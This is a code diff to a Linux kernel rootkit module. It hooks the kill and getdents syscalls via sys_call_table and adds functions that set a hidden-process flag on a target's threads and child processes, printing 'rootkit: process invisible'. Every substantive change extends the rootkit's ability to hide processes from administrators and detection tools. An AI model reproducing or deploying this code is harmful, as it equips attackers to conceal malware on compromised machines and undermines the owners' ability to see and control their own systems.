@@ -61,7 +61,7 @@ unsigned long *
 get_syscall_table_bf(void)
 {
 	unsigned long *syscall_table;
-	
+ 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
 	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
 	return syscall_table;
@@ -88,6 +88,50 @@ find_task(pid_t pid)
 			return p;
 	}
 	return NULL;
+}
+
+void
+changeInvisibleChildren(pid_t pid)
+{
+	struct task_struct *task;
+	struct list_head *list;
+	if (!pid)
+		return;
+	task = find_task(pid);
+	if (!task)
+		return;
+	list_for_each(list, &task->children)
+	{
+		struct task_struct *child;
+		child = list_entry(list, struct task_struct, sibling);
+		if (child)
+		{
+			child->flags ^= PF_INVISIBLE;
+			changeInvisibleChildren(child->pid);
+		}
+	}
+	return;
+}
+
+void
+changeInvisibleThreads(pid_t pid)
+{
+	struct task_struct *task;
+	struct task_struct *thread;
+	if (!pid)
+		return;
+	task = find_task(pid);
+	if (!task)
+		return;
+	for_each_thread(task, thread)
+	{
+		if(thread->pid != task->pid)
+		{
+			printk("PID %d", thread->pid);
+			thread->flags ^= PF_INVISIBLE;
+		}
+	}
+	return;
 }
 
 int
@@ -192,7 +236,7 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 	struct inode *d_inode;
 
 	if (ret <= 0)
-		return ret;	
+		return ret; 
 
 	kdirent = kzalloc(ret, GFP_KERNEL);
 	if (kdirent == NULL)
@@ -258,12 +302,18 @@ hacked_kill(pid_t pid, int sig)
 			if ((task = find_task(pid)) == NULL || is_invisible(pid) == true)
 				return -ESRCH;
 			task->flags ^= PF_INVISIBLE;
+			// uncomment for process that creates child processes
+			//changeInvisibleChildren(task->pid);
+			changeInvisibleThreads(task->pid);
 			printk(KERN_INFO "rootkit: process invisible >:-)\n");
 			break;
 		case SIGVIS:
 			if ((task = find_task(pid)) == NULL || is_invisible(pid) == false)
 				return -ESRCH;
 			task->flags ^= PF_INVISIBLE;
+			// uncomment for process that creates child processes
+			//changeInvisibleChildren(task->pid);
+			changeInvisibleThreads(task->pid);
 			printk(KERN_INFO "rootkit: process visible :-(\n");
 			break;
 		default:
